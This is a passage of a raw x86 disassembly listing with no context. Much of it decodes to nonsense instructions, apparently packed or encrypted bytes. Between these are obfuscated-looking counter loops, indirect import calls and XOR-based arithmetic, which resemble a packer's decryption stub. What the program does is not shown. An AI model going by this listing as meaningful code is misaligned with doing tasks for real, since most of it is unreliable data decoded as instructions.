  408396:	sbb    dh,ch
  408398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408399:	fsubr  QWORD PTR [ebx+0x44]
  40839c:	mov    ch,0x2a
  40839e:	data16 rcr BYTE PTR [ebx-0x17],1
  4083a2:	mov    eax,gs:0xe3d64e5
  4083a8:	(bad)  
  4083aa:	xchg   al,dh
  4083ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083ad:	rcr    BYTE PTR [ecx-0x30],1
  4083b0:	enter  0xc53d,0x7e
  4083b4:	das    
  4083b5:	sub    esi,esi
  4083b7:	mov    bh,0x20
  4083b9:	bound  edi,QWORD PTR [ebp-0x64502df8]
  4083bf:	fadd   st(2),st
  4083c1:	lds    edx,FWORD PTR [ebp-0x52]
  4083c4:	neg    BYTE PTR [esi]
  4083c6:	jmp    0x3b0c:0x7d1d37c2
  4083cd:	mov    bh,0x71
  4083cf:	clc    
  4083d0:	scas   eax,DWORD PTR es:[edi]
  4083d1:	aas    
  4083d2:	mov    bh,0x30
  4083d4:	pop    esi
  4083d5:	pop    ds
  4083d6:	mov    bh,0x30
  4083d8:	lods   al,BYTE PTR ds:[esi]
  4083d9:	cmp    eax,0x28b74184
  4083de:	xchg   edx,eax
  4083df:	sub    edx,DWORD PTR [esi-0x5b02351f]
  4083e5:	jmp    0x88fa0f6e
  4083ea:	ret    0x8866
  4083ed:	push   ebp
  4083ee:	stos   BYTE PTR es:[edi],al
  4083ef:	dec    edi
  4083f0:	popf   
  4083f1:	xchg   ebx,eax
  4083f2:	(bad)  
  4083f3:	adc    dh,BYTE PTR [ecx]
  4083f5:	or     BYTE PTR [ecx+0x429b063b],ch
  4083fb:	imul   ebx,eax,0xffffff99
  4083fe:	retf   
  4083ff:	jnp    0x40846c
  408401:	dec    ebp
  408402:	shr    BYTE PTR [ebp+0x4e7733ed],1
  408408:	xor    al,0x88
  40840a:	repz mov bl,0x8a
  40840d:	mov    bl,cl
  40840f:	daa    
  408410:	loop   0x408478
  408412:	mov    al,0x33
  408414:	jecxz  0x40843a
  408416:	adc    edx,DWORD PTR [ecx-0x47]
  408419:	or     bl,BYTE PTR [ebx+0x25]
  40841c:	pop    es
  40841d:	outs   dx,DWORD PTR ds:[esi]
  40841e:	(bad)  [ecx]
  408420:	mov    bh,al
  408422:	mov    ch,0x6
  408424:	mov    DWORD PTR [ecx+0x710f6187],eax
  40842a:	dec    edx
  40842b:	xchg   edx,eax
  40842c:	int3   
  40842d:	sub    ah,BYTE PTR [esi-0xb5999b7]
  408433:	mov    dl,0xf9
  408435:	dec    esi
  408436:	sti    
  408437:	aaa    
  408438:	imul   edi,DWORD PTR [edi-0x1bd4bf55],0x33
  40843f:	xor    eax,0x2a6e6513
  408444:	mov    al,ds:0x11683da4
  408449:	inc    esi
  40844a:	add    ch,al
  40844c:	fsub   QWORD PTR [edi-0x2c813975]
  408452:	and    ecx,ebp
  408454:	(bad)  
  408455:	mov    esi,0x9a960ff7
  40845a:	push   esp
  40845b:	test   BYTE PTR [edi+0xc],al
  40845e:	fnclex 
  408460:	pop    esp
  408461:	stos   BYTE PTR es:[edi],al
  408462:	in     al,0x72
  408464:	mov    esp,0x6e03ec32
  408469:	inc    ebp
  40846a:	imul   eax,DWORD PTR [edx-0x585d5daa],0xd4f114f0
  408474:	out    dx,eax
  408475:	xor    eax,0x581128f6
  40847a:	rol    DWORD PTR [ebp-0x68],cl
  40847d:	hlt    
  40847e:	mov    bh,BYTE PTR [eax+0x4c]
  408481:	leave  
  408482:	or     BYTE PTR [edi],0x82
  408485:	imul   ebx,DWORD PTR [eax],0x558b0000
  40848b:	fadd   DWORD PTR [ecx+0x56c5df]
  408491:	add    BYTE PTR [ebx+0x1d33fc7d],cl
  408497:	push   esi
  408498:	cs inc ebx
  40849a:	add    BYTE PTR [ebx],dh
  40849c:	rol    BYTE PTR [ecx+0x43449125],1
  4084a2:	add    BYTE PTR [eax],al
  4084a4:	add    BYTE PTR [eax],al
  4084a6:	add    cl,ch
  4084a8:	sldt   WORD PTR [eax]
  4084ab:	add    BYTE PTR [ebx],dh
  4084ad:	(bad)  [ebx]
  4084af:	sbb    eax,0x434491
  4084b4:	inc    ebx
  4084b5:	mov    DWORD PTR ds:0x434491,ebx
  4084bb:	cmp    DWORD PTR ds:0x434491,0x18
  4084c2:	jae    0x4084e3
  4084c8:	cmp    DWORD PTR ds:0x434491,0x22
  4084cf:	jne    0x4084de
  4084d5:	push   DWORD PTR [ebp-0x1c]
  4084d8:	call   DWORD PTR ds:0x432cc2
  4084de:	jmp    0x4084ac
  4084e3:	xor    edi,eax
  4084e5:	add    edi,ecx
  4084e7:	mov    ebx,DWORD PTR ds:0x43449d
  4084ed:	add    DWORD PTR ds:0x432e4a,ebx
  4084f3:	add    edx,ecx
  4084f5:	add    DWORD PTR ds:0x4343e6,ecx
  4084fb:	imul   edx,edi
  4084fe:	mov    edi,DWORD PTR [ebp-0x8]
  408501:	mov    ebx,DWORD PTR ds:0x4344ad
  408507:	or     DWORD PTR ds:0x434499,ebx
  40850d:	mov    ebx,DWORD PTR [ebp-0x10]
  408510:	sub    ebx,edi
  408512:	cmp    ebx,edx
  408514:	mov    DWORD PTR ds:0x4344a5,0x4da5
  40851e:	ja     0x40879c
  408524:	and    DWORD PTR ds:0x43277c,0x0
  40852e:	jmp    0x408540
  408533:	mov    edx,DWORD PTR ds:0x43277c
  408539:	inc    edx
  40853a:	mov    DWORD PTR ds:0x43277c,edx
  408540:	cmp    DWORD PTR ds:0x43277c,0x1b
  408547:	jae    0x408786
  40854d:	cmp    DWORD PTR ds:0x43277c,0x1d
  408554:	jne    0x408563
  40855a:	push   DWORD PTR [ebp-0x28]
  40855d:	call   DWORD PTR ds:0x432a52
  408563:	jmp    0x408533
  408568:	adc    DWORD PTR ds:0x432e46,0x7927
  408572:	jmp    0x408786
  408577:	rcr    DWORD PTR [ebp-0xc8d3cb2],0x51
  40857e:	popf   
  40857f:	push   es
  408580:	stos   DWORD PTR es:[edi],eax
  408581:	arpl   bp,sp
  408583:	(bad)  
  408584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408585:	ins    DWORD PTR es:[edi],dx
  408586:	lods   al,BYTE PTR ds:[esi]
  408587:	test   al,0xd4
  408589:	jo     0x4085fb
  40858b:	imul   edi,DWORD PTR [edi+0x70],0xee498f70
  408592:	loope  0x4085d5
  408594:	jno    0x4085f4
  408596:	xchg   ebp,eax
  408597:	add    DWORD PTR [ecx-0x3f],0xffffffcf
  40859b:	push   ebp
  40859c:	pop    edx
  40859d:	ins    BYTE PTR es:[edi],dx
  40859e:	mov    bl,0xf
  4085a0:	stc    
  4085a1:	shl    BYTE PTR [edi],1
  4085a3:	dec    ebx
  4085a4:	ja     0x4085d0
  4085a6:	retf   0x9259
  4085a9:	sbb    eax,DWORD PTR [ebp+eiz*8+0x2c76defc]
  4085b0:	les    esp,FWORD PTR [edi]
  4085b2:	xchg   esp,eax
  4085b3:	rcr    DWORD PTR [edi-0x1e],cl
  4085b6:	lock not BYTE PTR [ebx-0x60]
  4085ba:	jns    0x40862e
  4085bc:	sbb    al,0x94
  4085be:	lds    edi,FWORD PTR [eax+0x683b4ee4]
  4085c4:	pmullw mm2,mm2
  4085c7:	inc    esp
  4085c8:	mov    ecx,DWORD PTR [edx-0x33]
  4085cb:	shr    DWORD PTR [ebx],1
  4085cd:	cmp    eax,0xda1afe8f
  4085d2:	mov    al,0x63
  4085d4:	pop    ss
  4085d5:	inc    ebx
  4085d6:	or     BYTE PTR [edi-0x47],dh
  4085d9:	push   edx
  4085da:	sbb    eax,0x5f1b7650
  4085df:	out    0xc0,al
  4085e1:	ficomp WORD PTR [ebx]
  4085e3:	cwde   
  4085e4:	fild   DWORD PTR [ecx+0x5]
  4085e7:	jp     0x4085c7
  4085e9:	adc    DWORD PTR [bx+si-0x2e],ebp
  4085ed:	cmp    BYTE PTR [eax-0x4e],dh
  4085f0:	rol    edx,cl
  4085f2:	mov    esi,0x65936caf
  4085f7:	sbb    BYTE PTR [ebx-0x1ba96caf],ch
  4085fd:	jne    0x408636
  4085ff:	cmp    ebx,0xea5c98ea
  408605:	sub    ebx,DWORD PTR [edi-0x23]
  408608:	aad    0xe5
  40860a:	fistp  QWORD PTR [esi+0x64169311]
  408610:	mov    esi,0x1ac3cc96
  408615:	inc    edx
  408616:	xchg   DWORD PTR [edi],esi
  408618:	and    ah,BYTE PTR [esp+ebp*2+0x4a]
  40861c:	or     al,0x26
  40861e:	jo     0x4085f5
  408620:	or     edx,DWORD PTR [ecx+esi*2+0x72]
  408624:	mov    eax,ds:0x4653920
  408629:	xor    DWORD PTR [edx+0x21],esp
  40862c:	jb     0x408620
  40862e:	jmp    0x58eb:0x4638801f
  408635:	(bad)  
  408636:	popf   
  408637:	rol    BYTE PTR [ebp-0x20],0xe3
  40863b:	lahf   
  40863c:	imul   edi,DWORD PTR ds:0x2efda6ca,0x6a577ffa
  408646:	daa    
  408647:	rcl    edi,0x9c
  40864a:	push   0x59
  40864c:	neg    BYTE PTR [edi-0x4d]
  40864f:	loopne 0x4086a7
  408651:	mov    eax,0x49ec97a3
  408656:	cmp    dl,bh
  408658:	scas   eax,DWORD PTR es:[edi]
  408659:	dec    ecx
  40865a:	ret    
  40865b:	mov    edi,0xa93d4932
  408660:	sub    ah,BYTE PTR [esi-0x7f]
  408663:	(bad)  
  408664:	sub    al,0xb1
  408666:	sti    
  408667:	call   0xfec8:0x9db71244
  40866e:	data16 das 
  408670:	aad    0x55
  408672:	aam    0x84
  408674:	sub    DWORD PTR [eax+0xe59705e],0xc8cafd73
  40867e:	pop    edi
  40867f:	inc    ebx
  408680:	mul    BYTE PTR ds:0xb8d2c000
  408686:	pop    ebp
  408687:	pop    ecx
  408688:	out    dx,al
  408689:	fcomp  DWORD PTR [edx+0x65]
  40868c:	mov    al,BYTE PTR [ecx+0x29c66158]
  408692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408693:	mov    ds:0xba2cdbec,eax
  408698:	rcr    BYTE PTR [edi],0xec
  40869b:	ins    DWORD PTR es:[edi],dx
  40869c:	aas    
  40869d:	sbb    dh,ah
  40869f:	and    dl,BYTE PTR ds:0x2dc6
  4086a4:	test   eax,0x18bf4e77
  4086a9:	mov    dh,0xf3
  4086ab:	inc    eax
  4086ac:	imul   edx,DWORD PTR [ebp+0x64bdd3b],0x87b7371e
  4086b6:	xchg   edx,eax
  4086b7:	pop    ebx
  4086b8:	ds int 0x3
  4086bb:	pop    edi
  4086bc:	fadd   st(7),st
  4086be:	enter  0x4878,0xe0
  4086c2:	test   DWORD PTR [esi-0x2250d891],0x3f0d1c3
  4086cc:	call   0x83463690
  4086d1:	jne    0x4086f2
  4086d3:	mov    al,ds:0xa613bf3b
  4086d8:	xchg   esp,eax
  4086d9:	inc    edi
  4086da:	(bad)  
  4086db:	fwait
  4086dc:	push   es
  4086dd:	(bad)  
  4086de:	push   edi
  4086df:	pop    ecx
  4086e0:	jle    0x41dc1bee
  4086e6:	ins    BYTE PTR es:[edi],dx
  4086e7:	test   BYTE PTR [eax+ebx*4+0x5863d3e4],dl
  4086ee:	xor    ax,0xc6b
  4086f2:	dec    esp
  4086f3:	imul   edi,ecx,0xea1da63a
  4086f9:	adc    DWORD PTR [eax+0x17],esi
  4086fc:	arpl   WORD PTR [ecx+eax*1-0x6e],bp
  408700:	jno    0x408761
  408702:	jnp    0x40875c
  408704:	rcr    BYTE PTR [ecx-0x2c],0xf5
  408708:	xlat   BYTE PTR ds:[ebx]
  408709:	es daa 
  40870b:	push   ss
  40870c:	int3   
  40870d:	mov    eax,ds:0xe43508f8
  408712:	push   cs
  408713:	cdq    
  408714:	jmp    0x5f39e187
  408719:	mov    eax,0x290ed0a2
  40871e:	and    esi,DWORD PTR [esi-0x11d7b00]
  408724:	in     eax,dx
  408725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408726:	and    eax,0xbd0b9a17
  40872b:	rol    DWORD PTR [eax],0x82
  40872e:	fdiv   DWORD PTR [esi-0x62]
  408731:	call   0x9bd25dfd
  408736:	mov    esi,0xbb3b5a8b
  40873b:	out    dx,al
  40873c:	xor    bh,BYTE PTR [esi+0x6cf12ab2]
  408742:	imul   ebx,edx,0x11
  408745:	sbb    cl,ch
  408747:	aas    
  408748:	(bad)  
  408749:	push   esi
  40874a:	dec    edx
  40874b:	dec    ebx
  40874c:	xor    edi,DWORD PTR [esi-0x39]
  40874f:	rcl    BYTE PTR [ecx-0x3277a302],0x6c
  408756:	(bad)  
  408757:	jno    0x4087bf
  408759:	xchg   esi,eax
  40875a:	dec    ebx
  40875b:	pop    es
  40875c:	and    al,0xf2
  40875e:	jle    0x4086fd
  408760:	adc    eax,0xc5adbfed
  408765:	neg    DWORD PTR [ebp+0x2fb88bd3]
  40876b:	pop    edx
  40876c:	pop    edx
  40876d:	dec    edi
  40876e:	jae    0x40872f
  408770:	sbb    ebp,eax
  408772:	add    eax,esi
  408774:	adc    DWORD PTR [eax-0xf87ea6],0xff76418e
  40877e:	sbb    al,0xf9
  408780:	rol    BYTE PTR [eax+eiz*1],cl
  408783:	mov    dl,0x17
  408785:	mov    bl,0x8b
  408787:	push   ebp
  408788:	cld    
  408789:	xor    edx,eax
  40878b:	add    edx,ecx
  40878d:	mov    DWORD PTR ds:0x43440a,0x22ee
  408797:	jmp    0x408b38
  40879c:	and    edx,edi
  40879e:	mov    edx,DWORD PTR [ebp-0x2c]
  4087a1:	or     edi,edi
  4087a3:	mov    edi,DWORD PTR [ebp-0x4]
  4087a6:	xor    edx,eax
  4087a8:	not    ebx
  4087aa:	xor    edi,eax
  4087ac:	sub    DWORD PTR ds:0x43440a,0x43449d
  4087b6:	add    edi,ecx
  4087b8:	or     ebx,DWORD PTR ds:0x434495
  4087be:	add    edx,ecx
  4087c0:	or     DWORD PTR ds:0x43440e,edi
  4087c6:	imul   edx,edi
  4087c9:	adc    DWORD PTR ds:0x434495,ebx
  4087cf:	mov    edi,DWORD PTR [ebp-0x8]
  4087d2:	sub    ebx,0x42e0
  4087d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4087db:	and    DWORD PTR ds:0x4343f2,0x1110
  4087e5:	sub    ebx,edi
  4087e7:	cmp    ebx,edx
  4087e9:	mov    DWORD PTR ds:0x432788,0x5f46
  4087f3:	ja     0x40880b
  4087f9:	mov    edx,DWORD PTR [ebp-0x28]
  4087fc:	mov    DWORD PTR ds:0x4344a5,0x1e0
  408806:	jmp    0x408b2a
  40880b:	mov    edx,DWORD PTR [ebp-0x30]
  40880e:	mov    edi,DWORD PTR [ebp-0x4]
  408811:	xor    DWORD PTR ds:0x432e52,ecx
  408817:	xor    edx,eax
  408819:	mov    DWORD PTR ds:0x4343ea,0x13
  408823:	cmp    DWORD PTR ds:0x4343ea,0x0
  40882a:	je     0x40887c
  408830:	cmp    DWORD PTR ds:0x4343ea,0x4
  408837:	jne    0x40884e
  40883d:	push   0x4328fd
  408842:	push   DWORD PTR [ebp-0x20]
  408845:	push   DWORD PTR [ebp-0xc]
  408848:	call   DWORD PTR ds:0x432d7a
  40884e:	cmp    DWORD PTR ds:0x4343ea,0x5
  408855:	jne    0x40886a
  40885b:	xor    ebx,ebx
  40885d:	add    ebx,DWORD PTR ds:0x4343ea
  408863:	dec    ebx
  408864:	mov    DWORD PTR ds:0x4343ea,ebx
  40886a:	mov    ebx,DWORD PTR ds:0x4343ea
  408870:	dec    ebx
  408871:	mov    DWORD PTR ds:0x4343ea,ebx
  408877:	jmp    0x408823
  40887c:	xor    edi,eax
  40887e:	add    edi,ecx
  408880:	add    edx,ecx
  408882:	imul   edx,edi
  408885:	mov    edi,DWORD PTR [ebp-0x8]
  408888:	mov    ebx,DWORD PTR [ebp-0x10]
  40888b:	sub    ebx,edi
  40888d:	cmp    ebx,edx
  40888f:	ja     0x40889d
  408895:	mov    edx,DWORD PTR [ebp-0x2c]
  408898:	jmp    0x408b2a
  40889d:	mov    edx,DWORD PTR [ebp-0x34]
  4088a0:	mov    edi,DWORD PTR [ebp-0x4]
  4088a3:	xor    edx,eax
  4088a5:	xor    edi,eax
  4088a7:	add    edi,ecx
  4088a9:	add    edx,ecx
  4088ab:	imul   edx,edi
  4088ae:	mov    edi,DWORD PTR [ebp-0x8]
  4088b1:	mov    ebx,DWORD PTR [ebp-0x10]
  4088b4:	sub    ebx,edi
  4088b6:	cmp    ebx,edx
  4088b8:	ja     0x4088c6
  4088be:	mov    edx,DWORD PTR [ebp-0x30]
  4088c1:	jmp    0x408b2a
  4088c6:	mov    edx,DWORD PTR [ebp-0x38]
  4088c9:	mov    edi,DWORD PTR [ebp-0x4]
  4088cc:	xor    edx,eax
  4088ce:	xor    edi,eax
  4088d0:	add    edi,ecx
  4088d2:	add    edx,ecx
  4088d4:	imul   edx,edi
  4088d7:	mov    edi,DWORD PTR [ebp-0x8]
  4088da:	mov    ebx,DWORD PTR [ebp-0x10]
  4088dd:	sub    ebx,edi
  4088df:	cmp    ebx,edx
  4088e1:	ja     0x4088ef
  4088e7:	mov    edx,DWORD PTR [ebp-0x34]
  4088ea:	jmp    0x408b2a
  4088ef:	mov    edx,DWORD PTR [ebp-0x3c]
  4088f2:	mov    edi,DWORD PTR [ebp-0x4]
  4088f5:	xor    edx,eax
  4088f7:	xor    edi,eax
  4088f9:	add    edx,ecx
  4088fb:	add    edi,ecx
  4088fd:	imul   edx,edi
  408900:	mov    edi,DWORD PTR [ebp-0x8]
  408903:	mov    ebx,DWORD PTR [ebp-0x10]
  408906:	sub    ebx,edi
  408908:	cmp    ebx,edx
  40890a:	mov    edx,DWORD PTR [ebp-0x38]
  40890d:	jbe    0x408b2a
  408913:	mov    edx,DWORD PTR [ebp-0x3c]
  408916:	jmp    0x408b2a
  40891b:	imul   ebx,DWORD PTR [edx-0x5eb67e05],0x71
  408922:	jb     0x40895b
  408924:	adc    esi,DWORD PTR [ebx+0x71d8f34b]
  40892a:	ret    0xd2a1
  40892d:	jo     0x40899f
  40892f:	imul   edi,DWORD PTR [edi+0x70],0x20b0e370
  408936:	sar    ah,cl
  408938:	cdq    
  408939:	mov    bh,BYTE PTR [esi+0x30efaf68]
  40893f:	lock jo 0x4088ed
  408942:	sbb    DWORD PTR [edx-0x23a66900],esi
  408948:	or     BYTE PTR [edi],0xa5
  40894b:	int3   
  40894c:	(bad)  
  40894d:	push   esi
  40894e:	or     eax,0xa232b8fd
  408953:	div    DWORD PTR [ebx]
  408955:	test   DWORD PTR ss:[esi-0x23],ebp
  408959:	rcl    ebp,cl
  40895b:	adc    eax,0xccc0e279
  408960:	loop   0x4089ce
  408962:	jo     0x408987
  408964:	idiv   DWORD PTR [esi+0x68fe8298]
  40896a:	xchg   ebp,eax
  40896b:	aam    0x59
  40896d:	iret   
  40896e:	test   al,0xe1
  408970:	jo     0x408962
  408972:	xchg   ecx,eax
  408973:	call   0x34122f68
  408978:	mov    eax,0x4f8bc80a
  40897d:	add    DWORD PTR [esi],edi
  40897f:	ins    BYTE PTR es:[edi],dx
  408980:	out    0x97,al
  408982:	adc    BYTE PTR [ebp+esi*8-0x744d9059],dl
  408989:	shl    DWORD PTR [esp+ecx*8+0x68c186e8],0x1a
  408991:	ret    
  408992:	jp     0x408a01
  408994:	adc    ebx,DWORD PTR [ecx+0x6eb2cd8c]
  40899a:	xor    BYTE PTR [ebp-0x70],dl
  40899d:	bound  edx,QWORD PTR [edi-0x37]
  4089a0:	add    al,0x35
  4089a2:	int3   
  4089a3:	aas    
  4089a4:	mov    edi,0xc0f5796b
  4089a9:	je     0x408983
  4089ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089ac:	(bad)  
  4089ad:	fsubr  DWORD PTR [bp+si]
  4089b0:	push   eax
  4089b1:	(bad)  
  4089b2:	jp     0x408a20
  4089b4:	gs pop ebp
  4089b6:	pop    ebp
  4089b7:	(bad)  
  4089b8:	shl    BYTE PTR [ebx],1
  4089ba:	adc    al,BYTE PTR [edi-0x247254de]
  4089c0:	sbb    eax,0x5b8658d6
  4089c5:	or     eax,0x1324dbfe
  4089ca:	mov    ah,0x48
  4089cc:	aad    0x87
  4089ce:	hlt    
  4089cf:	jge    0x408a4f
  4089d1:	loope  0x408a23
  4089d3:	jmp    0x4089cf
  4089d5:	jns    0x408976
  4089d7:	out    0x59,eax
  4089d9:	inc    edi
  4089da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089db:	xchg   esp,eax
  4089dc:	pop    edi
  4089dd:	iret   
  4089de:	push   eax
  4089df:	cdq    
  4089e0:	pop    ds
  4089e1:	test   BYTE PTR [ebx],bl
  4089e3:	sbb    ebx,DWORD PTR [edx]
  4089e5:	sbb    bh,BYTE PTR [edx]
  4089e7:	mov    esp,0xa91a4b5
  4089ec:	stos   WORD PTR es:[edi],ax
  4089ee:	stos   BYTE PTR es:[edi],al
  4089ef:	pop    ss
  4089f0:	stos   BYTE PTR es:[edi],al
  4089f1:	adc    ch,BYTE PTR [edi+0x1]
  4089f4:	adc    al,0x6b
  4089f6:	icebp  
  4089f7:	sub    eax,0xeca16be0
  4089fc:	xchg   edi,eax
  4089fd:	cwde   
  4089fe:	ins    DWORD PTR es:[edi],dx
  4089ff:	es mov edx,0xf99351a7
  408a05:	cmc    
  408a06:	pop    ebx
  408a07:	rcl    BYTE PTR [ebx+ebp*2-0x2ca2bd],cl
  408a0e:	cs push ebp
  408a10:	fisub  WORD PTR [edi+0x7c]
  408a13:	je     0x408a85
  408a15:	add    eax,0x7664cd5
  408a1a:	pop    ebp
  408a1b:	std    
  408a1c:	add    dl,BYTE PTR [ecx-0x22ee8b20]
  408a22:	iret   
  408a23:	arpl   WORD PTR [edx],ax
  408a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a26:	push   cs
  408a27:	mov    dh,0x93
  408a29:	jl     0x408aa5
  408a2b:	ror    BYTE PTR [ebx-0x77],0xc6
  408a2f:	in     eax,0x3f
  408a31:	loope  0x408a74
  408a33:	xchg   ebp,eax
  408a34:	dec    esp
  408a35:	das    
  408a36:	cmp    cl,BYTE PTR [ebx+0x2]
  408a39:	jge    0x408a2d
  408a3b:	out    0xc3,al
  408a3d:	inc    eax
  408a3e:	or     ah,BYTE PTR [edx+0x61]
  408a41:	sysexit 
  408a43:	into   
  408a44:	(bad)  
  408a45:	sub    eax,0x9f2ac9bc
  408a4a:	sbb    ah,BYTE PTR [esi-0x73b3f176]
  408a50:	lea    edx,[edi]
  408a52:	xchg   ecx,eax
  408a53:	adc    esp,ecx
  408a55:	dec    edi
  408a56:	int    0xf1
  408a58:	cmc    
  408a59:	shl    dh,cl
  408a5b:	xor    eax,0xd55a7313
  408a60:	in     eax,0x1c
  408a62:	stos   BYTE PTR es:[edi],al
  408a63:	mov    ebp,0x768971ac
  408a68:	sbb    eax,0x6ca5e02a
  408a6d:	sti    
  408a6e:	in     al,0xc9
  408a70:	bound  esp,QWORD PTR [ecx+0x4b]
  408a73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a74:	ds iret 
  408a76:	pop    ebx
  408a77:	dec    ebx
  408a78:	adc    cl,dh
  408a7a:	sub    al,cl
  408a7c:	xor    edi,ecx
  408a7e:	shl    DWORD PTR [esi+0x8],cl
  408a81:	movq   mm5,QWORD PTR [esi+0x2b]
  408a85:	not    DWORD PTR [ebx]
  408a87:	fdivr  DWORD PTR [ebp-0x36664520]
  408a8d:	ds mov esi,gs
  408a90:	shr    al,1
  408a92:	lahf   
  408a93:	retf   0x8cff
  408a96:	(bad)  
  408a97:	push   0x20
  408a99:	mov    ds:0x5bc2643a,al
  408a9e:	shl    DWORD PTR [esi-0x28a0e67],1
  408aa4:	js     0x408a4b
  408aa6:	add    ebx,DWORD PTR [edx+esi*8+0x73]
  408aaa:	mov    bl,0x18
  408aac:	jnp    0x408ad8
  408aae:	fcomp  QWORD PTR ss:[esp+edi*1+0x487147f]
  408ab6:	dec    esi
  408ab7:	dec    edx
  408ab8:	fsub   QWORD PTR [ecx+ecx*4-0x43]
  408abc:	mov    edx,0x92ad7939
  408ac1:	sahf   
  408ac2:	cmp    BYTE PTR [ebp+0x2db5632c],0x40
  408ac9:	xchg   esi,eax
  408aca:	inc    edx
  408acb:	std    
  408acc:	sbb    al,0x58
  408ace:	cld    
  408acf:	not    BYTE PTR [ebx-0x24]
  408ad2:	mov    edi,0xf0e85301
  408ad7:	xchg   ebx,eax
  408ad8:	ins    BYTE PTR es:[edi],dx
  408ad9:	mov    ds:0xba6c77d0,al
  408ade:	scas   eax,DWORD PTR es:[edi]
  408adf:	mov    DWORD PTR [ebp+0x5707204d],ecx
  408ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ae6:	mov    dl,0x70
  408ae8:	loopne 0x408b3e
  408aea:	jl     0x408b31
  408aec:	inc    ebx
  408aed:	out    0x3a,al
  408aef:	cmp    al,0xc9
  408af1:	mov    bl,0x4f
  408af3:	and    eax,0xe2d9988
  408af8:	xlat   BYTE PTR ds:[ebx]
  408af9:	jns    0x408acf
  408afb:	out    0xdb,eax
  408afd:	ror    DWORD PTR [ecx+0x77],cl
  408b00:	out    dx,eax
  408b01:	pop    ecx
  408b02:	aad    0xed
  408b04:	xor    ecx,ebp
  408b06:	fstp   TBYTE PTR [ebx+0x74]
  408b09:	das    
  408b0a:	cmp    eax,0x25be1cc8
  408b0f:	dec    esi
  408b10:	sub    DWORD PTR [edi],ecx
  408b12:	pop    edi
  408b13:	mov    ch,0x6b
  408b15:	in     eax,dx
  408b16:	and    DWORD PTR [ecx+eiz*8+0x7],0xffffff9a
  408b1b:	ins    DWORD PTR es:[edi],dx
  408b1c:	jmp    0x408ab7
  408b1e:	call   0xaaf:0xf7fc85b2
  408b25:	pop    es
  408b26:	rcl    DWORD PTR [ebx+0x1d],cl
  408b29:	ror    BYTE PTR [ebx-0x7cc0383],0x33
  408b30:	rol    BYTE PTR [ebx],1
  408b32:	stc    
  408b33:	add    edx,ecx
  408b35:	imul   edx,edi
  408b38:	mov    DWORD PTR [ebp+0xc],edx
  408b3b:	mov    edx,DWORD PTR [ebp+0xc]
  408b3e:	mov    DWORD PTR [ebp-0x24],edx
  408b41:	mov    edx,DWORD PTR [ebp-0x8]
  408b44:	add    edx,DWORD PTR [ebp-0x40]
  408b47:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408b4e:	mov    DWORD PTR [ebp-0x1c],edx
  408b51:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  408b58:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  408b5f:	mov    edx,DWORD PTR [ebp-0x18]
  408b62:	xor    edx,eax
  408b64:	add    edx,ecx
  408b66:	jmp    0x409637
  408b6b:	mov    edx,DWORD PTR [ebp-0x18]
  408b6e:	xor    edx,eax
  408b70:	add    edx,DWORD PTR [ebp-0x14]
  408b73:	mov    edi,DWORD PTR [ebp-0x1c]
  408b76:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408b7d:	mov    BYTE PTR [ebp+0xf],dl
  408b80:	jmp    0x408d94
  408b85:	arpl   WORD PTR [ecx+edx*8+0x7359f11a],dx
  408b8c:	push   ecx
  408b8d:	out    0xb0,eax
  408b8f:	jnp    0x408bf2
  408b91:	test   eax,0x9ab2a75c
  408b96:	shl    BYTE PTR [eax+0x70],1
  408b99:	imul   edi,DWORD PTR [edi+0x70],0x75644d70
  408ba0:	jmp    0x408b3c
  408ba2:	sub    ebp,esi
  408ba4:	popf   
  408ba5:	mov    gs,WORD PTR [edi+ebp*4+0x77b7ca6f]
  408bac:	add    esi,eax
  408bae:	fcmovu st,st(6)
  408bb0:	mov    dh,0xdd
  408bb2:	mov    esp,DWORD PTR [ebx+0x18]
  408bb5:	mov    ebx,0x986407b5
  408bba:	(bad)  [ebx+0x18cd0467]
  408bc0:	shr    DWORD PTR [edx+0xb],1
  408bc3:	hlt    
  408bc4:	std    
  408bc5:	das    
  408bc6:	ret    0xb277
  408bc9:	das    
  408bca:	mov    esp,DWORD PTR [ecx+0xb]
  408bcd:	or     bh,BYTE PTR [eax]
  408bcf:	aas    
  408bd0:	inc    ebx
  408bd1:	(bad)
  408bd4:	add    DWORD PTR [ebp+0x2],edx
  408bd7:	or     DWORD PTR [edx],ecx
  408bd9:	aaa    
  408bda:	jmp    0xf67f:0xe18e97ed
  408be1:	(bad)  
  408be2:	shr    esp,0xa4
  408be5:	sbb    edx,ecx
  408be7:	ret    0x5330
  408bea:	and    edx,DWORD PTR ds:0x1225aa40
  408bf0:	test   dh,bh
  408bf2:	dec    esi
  408bf3:	pop    edi
  408bf4:	or     cl,0xe8
  408bf7:	pop    eax
  408bf8:	push   esp
  408bf9:	xchg   edi,eax
  408bfa:	outs   dx,DWORD PTR ds:[esi]
  408bfb:	cld    
  408bfc:	loope  0x408bdc
  408bfe:	dec    edi
  408bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c00:	retf   0x7fcf
  408c03:	xchg   esp,eax
  408c04:	ja     0x408b8e
  408c06:	iret   
  408c07:	ret    
  408c08:	jge    0x408c3e
  408c0a:	je     0x408c22
  408c0c:	dec    ebx
  408c0d:	jb     0x408bc4
  408c0f:	sub    eax,0x5554dc2f
  408c14:	pop    edi
  408c15:	sub    BYTE PTR [ecx+0x1b],cl
  408c18:	les    eax,FWORD PTR [esi+0x74423e03]
  408c1e:	fadd   DWORD PTR [esi-0x6c906130]
  408c24:	xlat   BYTE PTR ds:[ebx]
  408c25:	mov    ds:0x47c30bdc,al
  408c2a:	ret    
  408c2b:	sbb    DWORD PTR [esi-0x7d],edx
  408c2e:	cs jb  0x408cb0
